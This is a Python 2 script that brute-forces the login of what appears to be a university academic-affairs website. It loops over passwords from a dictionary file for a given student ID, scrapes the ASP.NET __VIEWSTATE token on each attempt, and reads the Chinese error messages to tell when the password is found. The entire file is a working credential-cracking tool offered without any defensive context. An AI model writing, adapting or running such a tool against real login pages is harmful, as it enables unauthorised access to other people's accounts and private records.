#!/usr/bin/env python
# encoding: utf-8
#-*- coding=utf-8 -*-

import re
import sys
import urllib
import StringIO
import pycurl
from bs4 import BeautifulSoup


jw_url = "http://10.10.8.14/"

f=open("dict.txt")

def doHTTPMethod(dest,method,params,cookie_string='',refer=''):

    c = pycurl.Curl()

    if(method == "GET"):
    	c.setopt(c.URL, str(dest) + '?' + urllib.urlencode(params))
    elif(method == "POST"):
    	c.setopt(c.URL, str(dest))
    	c.setopt(c.POST, 1)
    	c.setopt(c.POSTFIELDS, urllib.urlencode(params))

    if(refer):
	c.setopt(c.REFERER, refer)


    c.setopt(c.HTTPHEADER,[
    	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    	'Accept-Encoding: gzip, deflate',
    	'Accept-Language: en-US,en;q=0.5',
    	'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:18.0) Gecko/20100101 Firefox/18.0',
    	'Cache-Control: max-age=0', 
    	'Connection: keep-alive'
    	])
 
    fp = StringIO.StringIO()
    hdr = StringIO.StringIO()

    c.setopt(c.WRITEFUNCTION, fp.write)
    c.setopt(c.HEADERFUNCTION, hdr.write)
    if (cookie_string != ''):
    	c.setopt(c.COOKIE,cookie_string)
 
    c.perform()

    result_dict = {"header":hdr.getvalue(),"body":fp.getvalue()}
    return result_dict

def main():

    xh = sys.argv[1]
    pw = f.readline().strip()
    
    while 1:

	#pre_header =  doHTTPMethod(jw_url,"GET",{})['header']
	#url_hash = pre_header[pre_header.find('Location: /(')+11:pre_header.find('/Default.aspx')];
	

	login_url = jw_url + '/default_ysdx.aspx'	#default5.aspx 
	cookie = ""

	#login_page = doHTTPMethod(login_url,"GET",{},cookie)['body']
	login_page = doHTTPMethod(login_url,"GET",{})['body']
	
	vs = re.findall('<input[^>]*name=\"__VIEWSTATE\"[^>]*value=\"([^"]*)\"[^>]*>',login_page,re.S)
	vs = vs[0]
	
	params = {
	'TextBox1':xh,
	'TextBox2':pw,
	#'TextBox3':checkcode,
	'__VIEWSTATE' : vs,
	'ddl_js':'学生',
	'Button1':' 登 录 '
	}

        login_return = doHTTPMethod(login_url,"POST",params,cookie)
        login_result = login_return['body']

	# Check if logged in valid
        login_result = BeautifulSoup(login_result).text



	if u"用户名不存在" in login_result:
	    success = 2
	    
	elif u"密码错误" in login_result:
	    success = 0
	    
	#elif u"验证码不正确" in login_result:
	    #success = 0
	elif "xs_main.aspx" in login_result:
	    success = 1

        if (success == 2):
            print "Wrong username"
            break
            
        elif (success == 1):
            print"************************"
            print xh
            print "This is your password:"	
            print pw
            print"************************"
            break

        else:
            print" " 
            print"#################"
            print "Wrong password:"
            print pw
            print"#################"
            print" " 

            pw = f.readline().strip()
            if (pw == ""):
                print"XXXXXXXXXXXXXXXX"
                print "crack fail"
                print"XXXXXXXXXXXXXXXX"
                break

if __name__ == '__main__':
    main()
	
    

